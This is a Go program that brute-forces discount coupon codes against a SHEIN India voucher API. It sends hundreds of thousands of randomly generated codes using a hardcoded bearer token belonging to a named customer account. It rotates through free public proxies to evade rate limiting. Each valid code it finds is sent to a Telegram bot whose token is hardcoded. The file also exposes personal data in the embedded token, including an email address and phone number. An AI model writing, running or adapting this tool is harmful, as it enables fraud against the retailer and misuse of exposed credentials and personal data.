package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// --- CONFIGURATION ---
const (
	API_URL        = "https://api.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/manishisjh2@gmail.com/carts/SH7315703937/vouchers"
	TOTAL_TO_CHECK = 500000
	CONCURRENCY    = 10
	
	// TELEGRAM INFO
	TELEGRAM_TOKEN   = "7960235034:AAGspuayD8vd-CnAkGp1LjpUv2RhcoopqKU"
	TELEGRAM_CHAT_ID = "7177581474"
)

var headers = map[string]string{
	"Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzaGVpbl9tYW5pc2hpc2poMkBnbWFpbC5jb20iLCJwa0lkIjoiYWQyZDk0ZWEtMjBiMi00YWNmLWI3MjItOTZlNjQ5NzY4OGYzIiwiY2xpZW50TmFtZSI6InRydXN0ZWRfY2xpZW50Iiwicm9sZXMiOlt7Im5hbWUiOiJST0xFX0NVU1RPTUVSR1JPVVAifV0sIm1vYmlsZSI6Ijc5NzMzNjYzOTgiLCJ0ZW5hbnRJZCI6IlNIRUlOIiwiZXhwIjoxNzcxNTgxNDQ0LCJ1dWlkIjoiYWQyZDk0ZWEtMjBiMi00YWNmLWI3MjItOTZlNjQ5NzY4OGYzIiwiaWF0IjoxNzY4OTg5NDQ0LCJlbWFpbCI6Im1hbmlzaGlzamgyQGdtYWlsLmNvbSJ9.mvm2vKeeoK-_qJ0dBGbsIldXLzfeBdj9lBYxH53r90Z4aU1G2hLJWJ7NsZlmyho2MIrYxpgOd2ahpZgD3wAFg8GdQTA0uv8_DxSoQfRQCCIfFSf3ZpFdScWDDJVOFtw1gzzGijGugyA0btZx6vNsPFL53HcTffb7tqDMvyG_qmBdEoIMxEMBJoAIaDrp2c8meLY51BbatloCqdaPSgjK4euqo_wf5lck9lyXirKUVJKzrXBSncAu8hbtT5RxDJ-RYW4AFS_jOVU1SsCUZJ5TDZRqLxhN1UBekUoq4PZMuBaV5hJ8cFgRlJlsGiXALje4vHcl0CWGoqLed7rRqd4h1w",
	"Accept":        "application/json",
	"User-Agent":    "Android",
	"X-TENANT-ID":   "SHEIN",
	"Content-Type":  "application/x-www-form-urlencoded",
}

type Stats struct {
	mu        sync.Mutex
	Checked   int
	Hits      int
	HitsList  []string
	StartTime time.Time
	Status    string
	Proxies   []string
}

var stats = Stats{StartTime: time.Now(), Status: "Initializing..."}

// --- PROXY FETCHER ---
func fetchProxies() {
	resp, err := http.Get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
	if err != nil { return }
	defer resp.Body.Close()

	scanner := bufio.NewScanner(resp.Body)
	var list []string
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			list = append(list, "http://"+proxy)
		}
	}
	stats.mu.Lock()
	stats.Proxies = list
	stats.mu.Unlock()
}

func generateCoupon() string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 12)
	for i := range b { b[i] = chars[rand.Intn(len(chars))] }
	return "SVI" + string(b)
}

func sendToTelegram(coupon string) {
	msg := fmt.Sprintf("🎯 HIT FOUND!\nCoupon: %s", coupon)
	tgUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", 
		TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, url.QueryEscape(msg))
	http.Get(tgUrl)
}

func worker(wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		stats.mu.Lock()
		if stats.Checked >= TOTAL_TO_CHECK || stats.Status == "TOKEN EXPIRED" {
			stats.mu.Unlock()
			break
		}
		
		// Pick a random proxy
		proxyStr := ""
		if len(stats.Proxies) > 0 {
			proxyStr = stats.Proxies[rand.Intn(len(stats.Proxies))]
		}
		stats.mu.Unlock()

		// Setup Client with Proxy
		transport := &http.Transport{}
		if proxyStr != "" {
			proxyUrl, _ := url.Parse(proxyStr)
			transport.Proxy = http.ProxyURL(proxyUrl)
		}
		client := &http.Client{Transport: transport, Timeout: 10 * time.Second}

		coupon := generateCoupon()
		data := url.Values{}
		data.Set("voucherId", coupon)
		data.Set("employeeOfferRestriction", "true")

		req, _ := http.NewRequest("POST", API_URL, strings.NewReader(data.Encode()))
		for k, v := range headers { req.Header.Set(k, v) }

		resp, err := client.Do(req)
		if err != nil { continue }

		if resp.StatusCode == 401 {
			stats.mu.Lock()
			stats.Status = "TOKEN EXPIRED"
			stats.mu.Unlock()
			resp.Body.Close()
			return
		}

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			stats.mu.Lock()
			stats.Hits++
			stats.HitsList = append(stats.HitsList, coupon)
			stats.mu.Unlock()
			go sendToTelegram(coupon)
		}
		resp.Body.Close()

		stats.mu.Lock()
		stats.Checked++
		stats.Status = "Running"
		stats.mu.Unlock()
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	
	// Initial Proxy Load
	fetchProxies()
	go func() { // Refresh proxies every 10 minutes
		for {
			time.Sleep(10 * time.Minute)
			fetchProxies()
		}
	}()

	port := os.Getenv("PORT")
	if port == "" { port = "8080" }

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		stats.mu.Lock()
		defer stats.mu.Unlock()
		fmt.Fprintf(w, "Status: %s | Checked: %d | Hits: %d | Proxies: %d", stats.Status, stats.Checked, stats.Hits, len(stats.Proxies))
	})

	var wg sync.WaitGroup
	for i := 0; i < CONCURRENCY; i++ {
		wg.Add(1)
		go worker(&wg)
	}

	http.ListenAndServe(":"+port, nil)
	wg.Wait()
}
